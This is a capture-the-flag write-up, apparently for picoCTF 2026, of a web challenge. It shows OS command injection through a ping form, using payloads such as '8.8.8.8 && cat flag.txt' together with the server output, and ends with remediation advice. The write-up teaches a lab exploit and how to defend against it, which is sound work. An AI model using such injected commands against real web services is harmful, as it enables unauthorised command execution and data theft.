CyLab 2026 – Ping-cmd Write-up
---
Step 0 - Challenge Info
CTF Name: picoCTF 2026
Challenge Name: ping-cmd
Category: Web Exploitation
Points: 100
Date: 9/15/2026
Flag: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_........}`
---
TL;DR (Abstract)
The challenge exposes a web service utility that allows users to test network reachability by pinging an IP address. The backend constructs a system shell command by concatenating unvalidated user input directly into the `ping` invocation. Because input sanitization and command separation boundaries are absent, an attacker can append shell metacharacters (`&&`) to execute arbitrary operating system commands. By chaining commands to list the working directory and subsequently print `flag.txt`, arbitrary code execution was achieved and the flag was retrieved directly from stdout.
---
Challenge Description
> Can you ping a host using our network inspection tool? Check connectivity and see if you can break out of the intended functionality to inspect the server files and retrieve the flag.
---
Thought Process & Walkthrough
1. Initial Reconnaissance
Inspect the web application form, which prompts for a host or IP address to run the standard ICMP ping utility. Testing standard input behavior:
```text
Input: 8.8.8.8
```
The server returns the raw output of the host system's `ping` binary:
```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=14.2 ms
...
```
This indicates the backend is executing a command comparable to `system("ping -c 1 " + user_input)` or using a shell execution wrapper without argument array separation.
2. Identifying Command Injection
In standard Unix shells, the boolean operator `&&` allows chaining multiple commands, executing the secondary command if the primary succeeds. Test if shell metacharacters are filtered:
```text
8.8.8.8 && ls
```
The underlying shell evaluates the full line:
```bash
ping -c 1 8.8.8.8 && ls
```
The application renders both the ping results and the directory contents:
```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=14.1 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 14.120/14.120/14.120/0.000 ms
index.php
flag.txt
```
3. Exploitation & Flag Capture
Having confirmed directory read access and located `flag.txt`, modify the payload to concatenate `cat flag.txt`:
```text
8.8.8.8 && cat flag.txt
```
The server processes the injection string and outputs the contents of the flag file:
```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=13.9 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 13.910/13.910/13.910/0.000 ms
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_........}
```
---
Remediation & Key Takeaways
Avoid Direct Shell Invocation: Do not invoke system utilities via `/bin/sh` or functions like `system()`, `exec()`, or `shell_exec()`. Use language-native network socket libraries (e.g., Python `socket`/`scapy` or PHP `fsockopen`) to verify reachability.
Use Parameterized Execution APIs: If calling system binaries is unavoidable, use subprocess APIs that pass arguments as an immutable array (such as `execve` or `subprocess.run(["ping", "-c", "1", ip], shell=False)`) to prevent argument interpretation as shell commands.
Strict Input Validation: Enforce strict allowlists and validation (e.g., `filter_var($ip, FILTER_VALIDATE_IP)` or strict regex matching `^[0-9]{1,3}(\.[0-9]{1,3}){3}$`) before passing inputs to any downstream component.
